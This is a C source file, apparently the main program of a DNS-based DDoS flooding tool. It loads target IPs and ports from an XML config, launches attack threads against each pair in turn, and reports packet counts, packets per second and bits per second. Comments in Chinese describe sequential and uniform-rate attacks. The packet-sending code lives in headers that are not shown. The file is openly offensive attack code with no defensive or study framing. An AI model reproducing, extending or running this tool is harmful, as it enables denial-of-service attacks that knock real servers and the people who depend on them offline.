#include <stdio.h>
#include <string.h>
#include <time.h>

#include "dnsattack_base.h"
#include "attack.h"

float attackTimeRealgo;

int main()
{    
    srand((int)time(0));
    unsigned long sendpackagenumberall,send_all_byte=0;
    double bps,pps,doublepacknum;
    
    int ret;
    ddosConfig ddosc;
    memset(&ddosc,0,sizeof(ddosConfig));
    ret = parse_doc_root(&ddosc,XMLCONF_ADDRESS);//从xml中读数据，并格式化(将style数据格式化)
    if(ret)
    {
		printf("X Error: xml format wrong.\n");
		//destroy_ddosConfig(ddosc);
    }

    //
    struct attackM_st attackM;
    int i,j;
    int attackIpLinklength,attackPortLinkLength;
    attackIpLinklength = getLinkLength_arr(ddosc.ipls);
    attackPortLinkLength = getLinkLength_arr(ddosc.portls);
    attackM.ddosc = &ddosc;
    for(i=0;i<attackIpLinklength;i++)
    {
        attackM.attackIp = getSomeone_arr(ddosc.ipls,i);
        for(j=0;j<attackPortLinkLength;j++)
        {
            attackM.attackPort = getSomeone_arr(ddosc.portls,j);
            /* output***************************************************/
			printf("******************************************\n");
            printf("* attack ip:%s,attack port:%s\n",attackM.attackIp,attackM.attackPort);
			printf("* ----------------------------------------\n");
			 
            /***********************************************************/
			newthread(attackM);//顺次攻击每个ip每个端口

			/* output***************************************************/
			sendpackagenumberall = getSendPackageNum(ddosc.startThreadNumber);
			send_all_byte = getSendByte(ddosc.startThreadNumber);
			printf("* ----------------------------------------\n");
			printf("* send all package number:%ld\n",sendpackagenumberall);
			printf("* send time(s):%.6fs\n",attackTimeRealgo);

			doublepacknum = (double)sendpackagenumberall;
            if(ddosc.pulseyn==1) 
            { //均匀攻击
                pps = doublepacknum/(attackTimeRealgo*1000);
                bps = ((double)send_all_byte*8)/(attackTimeRealgo);
                printf("* pps:%.3fk/s\n",pps);
                printf("* bps:%.3fb/s\n",bps);
            }
            printf("******************************************\n");
            /***********************************************************/
	    }
	}

    return 0;
}

